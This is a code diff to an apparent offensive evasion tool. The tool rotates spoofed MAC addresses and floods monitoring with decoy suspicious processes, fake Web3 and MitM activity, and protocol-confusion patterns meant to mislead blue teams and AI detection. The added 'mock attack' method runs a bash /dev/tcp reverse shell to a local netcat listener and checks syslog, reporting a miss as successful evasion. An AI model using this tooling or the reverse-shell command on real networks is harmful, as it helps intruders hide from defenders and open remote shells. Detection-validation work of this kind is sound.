@@ -22,13 +22,13 @@ class FleaFlickerEvasion:
     
     def __init__(self):
         self.mac_rotation_active = False
-        self.ai_trap_active = False
+        self.evasion_trap_active = False
         self.web3_mode = False
         self.mitm_active = False
         self.feint_mode = False
         self.original_mac = self.get_current_mac()
         self.mac_history = []
-        self.ai_trap_requests = []
+        self.evasion_trap_requests = []
         
     def get_current_mac(self):
         """Get current MAC address"""
@@ -76,7 +76,7 @@ class FleaFlickerEvasion:
         }
     
     def instant_mac_change(self, interface='eth0', vendor=None):
-        """Instantly change MAC address with one click"""
+        """Instantly change MAC address"""
         try:
             vendors = self.get_vendor_ouis()
             vendor_oui = vendors.get(vendor, None) if vendor else None
@@ -101,11 +101,11 @@ class FleaFlickerEvasion:
                 'vendor': vendor or 'random'
             })
             
-            print(f"🎭 MAC flicker: {new_mac} ({vendor or 'random'})")
+            print(f"[+] MAC rotation: {new_mac} ({vendor or 'random'})")
             return new_mac
             
         except Exception as e:
-            print(f"[!] MAC change failed: {e}")
+            print(f"[!] MAC rotation failed: {e}")
             return None
     
     def start_mac_noise(self, interface='eth0', interval=30):
@@ -118,7 +118,7 @@ class FleaFlickerEvasion:
             while self.mac_rotation_active:
                 try:
                     # Random vendor for realistic appearance
-                    vendor = random.choice(vendors + [None, None])  # 33% random, 66% vendor
+                    vendor = random.choice(vendors + [None, None])
                     self.instant_mac_change(interface, vendor)
                     
                     # Random interval for unpredictability
@@ -131,18 +131,17 @@ class FleaFlickerEvasion:
         
         thread = threading.Thread(target=mac_noise_worker, daemon=True)
         thread.start()
-        print(f"🎪 MAC noise started - rotating every ~{interval}s")
+        print(f"[*] MAC noise started - rotating every ~{interval}s")
     
     def stop_mac_noise(self):
         """Stop MAC address rotation"""
         self.mac_rotation_active = False
-        print("🛑 MAC noise stopped")
+        print("[*] MAC noise stopped")
     
-    def setup_ai_traps(self):
-        """Setup honeypots to confuse AI detection systems"""
-        self.ai_trap_active = True
+    def setup_evasion_traps(self):
+        """Setup traps to confuse behavioral detection systems"""
+        self.evasion_trap_active = True
         
-        # Create fake processes that look suspicious to AI
         fake_processes = [
             'chrome --disable-web-security --user-data-dir=/tmp/chrome',
             'python3 -c "import socket; s=socket.socket()"',
@@ -151,10 +150,9 @@ class FleaFlickerEvasion:
             'python3 -m http.server 8080'
         ]
         
-        def ai_trap_worker():
-            while self.ai_trap_active:
+        def evasion_trap_worker():
+            while self.evasion_trap_active:
                 try:
-                    # Generate fake network activity logs
                     fake_log = {
                         'timestamp': datetime.now().isoformat(),
                         'process': random.choice(fake_processes),
@@ -164,26 +162,25 @@ class FleaFlickerEvasion:
                         'fake': True
                     }
                     
-                    self.ai_trap_requests.append(fake_log)
+                    self.evasion_trap_requests.append(fake_log)
                     
-                    # Keep only last 100 fake logs
-                    if len(self.ai_trap_requests) > 100:
-                        self.ai_trap_requests = self.ai_trap_requests[-100:]
+                    if len(self.evasion_trap_requests) > 100:
+                        self.evasion_trap_requests = self.evasion_trap_requests[-100:]
                     
                     time.sleep(random.uniform(5, 30))
                     
                 except Exception as e:
-                    print(f"[!] AI trap error: {e}")
+                    print(f"[!] Evasion trap error: {e}")
                     time.sleep(10)
         
-        thread = threading.Thread(target=ai_trap_worker, daemon=True)
+        thread = threading.Thread(target=evasion_trap_worker, daemon=True)
         thread.start()
-        print("🕳️  AI traps activated - generating fake suspicious activity")
+        print("[*] Evasion traps activated - generating fake suspicious activity")
     
-    def stop_ai_traps(self):
-        """Stop AI trap generation"""
-        self.ai_trap_active = False
-        print("🛑 AI traps deactivated")
+    def stop_evasion_traps(self):
+        """Stop evasion trap generation"""
+        self.evasion_trap_active = False
+        print("[*] Evasion traps deactivated")
     
     def web3_attack_simulation(self):
         """Simulate Web3/blockchain attack patterns"""
@@ -213,7 +210,6 @@ class FleaFlickerEvasion:
                     target = random.choice(web3_targets)
                     pattern = random.choice(web3_patterns)
                     
-                    # Generate fake Web3 requests
                     fake_request = {
                         'timestamp': datetime.now().isoformat(),
                         'target': target,
@@ -223,7 +219,7 @@ class FleaFlickerEvasion:
                         'fake_web3': True
                     }
                     
-                    print(f"🪙 Web3 feint: {target}{pattern}")
+                    print(f"[*] Web3 feint: {target}{pattern}")
                     time.sleep(random.uniform(10, 60))
                     
                 except Exception as e:
@@ -232,12 +228,12 @@ class FleaFlickerEvasion:
         
         thread = threading.Thread(target=web3_worker, daemon=True)
         thread.start()
-        print("🌐 Web3 attack simulation started")
+        print("[*] Web3 attack simulation started")
     
     def stop_web3_simulation(self):
         """Stop Web3 attack simulation"""
         self.web3_mode = False
-        print("🛑 Web3 simulation stopped")
+        print("[*] Web3 simulation stopped")
     
     def setup_mitm_feints(self):
         """Setup fake MitM activity to confuse detection"""
@@ -246,7 +242,6 @@ class FleaFlickerEvasion:
         def mitm_feint_worker():
             while self.mitm_active:
                 try:
-                    # Generate fake ARP/DNS activity logs
                     fake_activities = [
                         f"ARP spoofing detected: {self.generate_random_mac()} -> 192.168.1.1",
                         f"DNS request intercepted: facebook.com -> 192.168.1.100",
@@ -255,7 +250,7 @@ class FleaFlickerEvasion:
                     ]
                     
                     activity = random.choice(fake_activities)
-                    print(f"🎯 MitM feint: {activity}")
+                    print(f"[*] MitM feint: {activity}")
                     
                     time.sleep(random.uniform(15, 45))
                     
@@ -265,114 +260,155 @@ class FleaFlickerEvasion:
         
         thread = threading.Thread(target=mitm_feint_worker, daemon=True)
         thread.start()
-        print("🕸️  MitM feints activated")
+        print("[*] MitM feints activated")
     
     def stop_mitm_feints(self):
         """Stop MitM feint generation"""
         self.mitm_active = False
-        print("🛑 MitM feints stopped")
+        print("[*] MitM feints stopped")
     
     def generate_protocol_confusion(self):
         """Generate confusing protocol patterns"""
         confusion_patterns = [
-            # Fake SSH over HTTP
             {'port': 80, 'protocol': 'SSH-2.0-OpenSSH_8.2', 'description': 'SSH over HTTP'},
-            # Fake HTTPS over telnet port
             {'port': 23, 'protocol': 'TLS 1.3 ClientHello', 'description': 'HTTPS over telnet'},
-            # Fake DNS over unusual ports
             {'port': 8080, 'protocol': 'DNS Query', 'description': 'DNS over HTTP proxy'},
-            # Fake VPN over DNS
             {'port': 53, 'protocol': 'OpenVPN', 'description': 'VPN over DNS'}
         ]
         
         for pattern in confusion_patterns:
-            print(f"🌀 Protocol confusion: {pattern['description']} on port {pattern['port']}")
+            print(f"[*] Protocol confusion: {pattern['description']} on port {pattern['port']}")
     
-    def emotional_ai_confusion(self):
-        """Generate emotional/psychological patterns to confuse AI analysis"""
-        emotional_patterns = [
-            "User exhibits frustrated typing patterns",
-            "Rapid-fire failed login attempts suggest desperation",
-            "Long pauses between commands indicate hesitation",
-            "Aggressive port scanning followed by immediate retreat",
-            "Erratic timing suggests human emotional state"
+    def heuristic_evasion_patterns(self):
+        """Generate patterns to confuse heuristic/behavioral analysis"""
+        patterns = [
+            "Variable typing patterns detected",
+            "Non-standard command execution timing",
+            "Erratic reconnaissance patterns",
+            "Protocol-agnostic payload delivery feints"
         ]
         
-        for pattern in emotional_patterns:
-            print(f"🧠 Emotional feint: {pattern}")
+        for pattern in patterns:
+            print(f"[*] Heuristic feint: {pattern}")
     
-    def quantum_noise_generator(self):
-        """Generate quantum-inspired random patterns"""
-        # Use system entropy for quantum-like randomness
+    def entropy_noise_generator(self):
+        """Generate high-entropy random patterns"""
         entropy = random.SystemRandom()
         
         patterns = []
         for _ in range(10):
             pattern = {
-                'quantum_bit': entropy.choice([0, 1]),
-                'superposition': entropy.random(),
-                'entanglement_id': entropy.randint(1000000, 9999999),
-                'measurement_time': datetime.now().isoformat()
+                'id': entropy.randint(1000000, 9999999),
+                'timestamp': datetime.now().isoformat(),
+                'entropy_seed': hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:16]
             }
             patterns.append(pattern)
         
-        print("⚛️  Quantum noise patterns generated")
+        print("[*] Entropy noise patterns generated")
         return patterns
     
     def flea_flicker_combo(self, interface='eth0'):
-        """Execute the ultimate flea flicker - multiple evasion techniques"""
-        print("🏈 FLEA FLICKER ACTIVATED!")
+        """Execute Flea Flicker - multiple evasion techniques"""
+        print("🏈 FLEA FLICKER ACTIVATED")
         print("=" * 50)
         
         # 1. Instant MAC change
-        print("1️⃣  Executing MAC address flicker...")
+        print("[1] Executing MAC address rotation...")
         self.instant_mac_change(interface, random.choice(['apple', 'cisco', 'dell']))
         
-        # 2. Start AI traps
-        print("2️⃣  Deploying AI confusion traps...")
-        self.setup_ai_traps()
+        # 2. Start traps
+        print("[2] Deploying evasion traps...")
+        self.setup_evasion_traps()
         
         # 3. Protocol confusion
-        print("3️⃣  Generating protocol confusion...")
+        print("[3] Generating protocol confusion...")
         self.generate_protocol_confusion()
         
-        # 4. Emotional patterns
-        print("4️⃣  Injecting emotional confusion...")
-        self.emotional_ai_confusion()
+        # 4. Heuristic patterns
+        print("[4] Injecting heuristic confusion...")
+        self.heuristic_evasion_patterns()
         
-        # 5. Quantum noise
-        print("5️⃣  Adding quantum noise...")
-        self.quantum_noise_generator()
+        # 5. Entropy noise
+        print("[5] Adding entropy noise...")
+        self.entropy_noise_generator()
         
         # 6. Start all background activities
-        print("6️⃣  Launching background evasion...")
+        print("[6] Launching background evasion...")
         self.start_mac_noise(interface, interval=20)
         self.web3_attack_simulation()
         self.setup_mitm_feints()
         
-        print("🏈 FLEA FLICKER COMPLETE - Blue team is confused!")
-        print("💫 Multiple evasion techniques now active")
+        print("🏈 FLEA FLICKER COMPLETE - Misdirection protocols active")
     
     def stop_all_evasion(self):
         """Stop all evasion techniques"""
-        print("🛑 Stopping all flea flicker activities...")
+        print("[*] Stopping all flea flicker activities...")
         self.stop_mac_noise()
-        self.stop_ai_traps()
+        self.stop_evasion_traps()
         self.stop_web3_simulation()
         self.stop_mitm_feints()
-        print("✅ All evasion techniques stopped")
+        print("[+] All evasion techniques stopped")
     
     def get_status(self):
         """Get current status of all evasion techniques"""
         status = {
             'mac_rotation': self.mac_rotation_active,
-            'ai_traps': self.ai_trap_active,
+            'evasion_traps': self.evasion_trap_active,
             'web3_mode': self.web3_mode,
             'mitm_feints': self.mitm_active,
             'mac_changes': len(self.mac_history),
-            'fake_requests': len(self.ai_trap_requests)
+            'fake_requests': len(self.evasion_trap_requests)
         }
         return status
+
+    def execute_mock_attack(self):
+        """Detection Validation Suite: Execute mock attack and verify logs"""
+        print("[*] Executing Mock Attack: Reverse Shell Simulation")
+        
+        # Start a local listener in the background
+        listener = subprocess.Popen(['nc', '-l', '-p', '4444'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
+        
+        # Execute the mock reverse shell attack
+        attack_cmd = "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
+        attack_proc = subprocess.Popen(['bash', '-c', attack_cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(2)
+        
+        # Cleanup processes
+        attack_proc.kill()
+        listener.kill()
+        
+        # Verify local security logs (Syslog) for capture
+        print("[*] Verifying Detection Logs...")
+        found = False
+        try:
+            with open('/var/log/syslog', 'r') as log_file:
+                logs = log_file.readlines()
+                for line in reversed(logs[-100:]):
+                    if '4444' in line or 'CEF' in line:
+                        found = True
+                        break
+        except PermissionError:
+            print("[!] Permission denied reading /var/log/syslog. Run with root privileges to verify logs.")
+            return False
+        except FileNotFoundError:
+            print("[-] Syslog not found, checking /var/log/messages...")
+            try:
+                with open('/var/log/messages', 'r') as log_file:
+                    logs = log_file.readlines()
+                    for line in reversed(logs[-100:]):
+                        if '4444' in line or 'CEF' in line:
+                            found = True
+                            break
+            except Exception:
+                pass
+                
+        if found:
+            print("[+] Mock attack detected and logged by SIEM integration.")
+            return True
+        else:
+            print("[-] Mock attack was NOT logged. Evasion successful or logging misconfigured.")
+            return False
 
 # Quick test/demo
 if __name__ == "__main__":
@@ -381,14 +417,14 @@ if __name__ == "__main__":
     
     evasion = FleaFlickerEvasion()
     
-    print("Current MAC:", evasion.get_current_mac())
-    print("Available vendors:", list(evasion.get_vendor_ouis().keys()))
+    print("[*] Current MAC:", evasion.get_current_mac())
+    print("[*] Available vendors:", list(evasion.get_vendor_ouis().keys()))
     
     # Demo some capabilities (safe mode)
-    print("\n🧪 Demo Mode - Safe Testing:")
+    print("\n[*] Demo Mode - Safe Testing:")
     evasion.generate_protocol_confusion()
-    evasion.emotional_ai_confusion()
-    evasion.quantum_noise_generator()
+    evasion.heuristic_evasion_patterns()
+    evasion.entropy_noise_generator()
     
-    print(f"\n📊 Status: {evasion.get_status()}")
-    print("\n💡 Use 'flea_flicker_combo()' for full evasion suite!")
+    print(f"\n[*] Status: {evasion.get_status()}")
+    print("\n[*] Use 'flea_flicker_combo()' for full evasion suite")
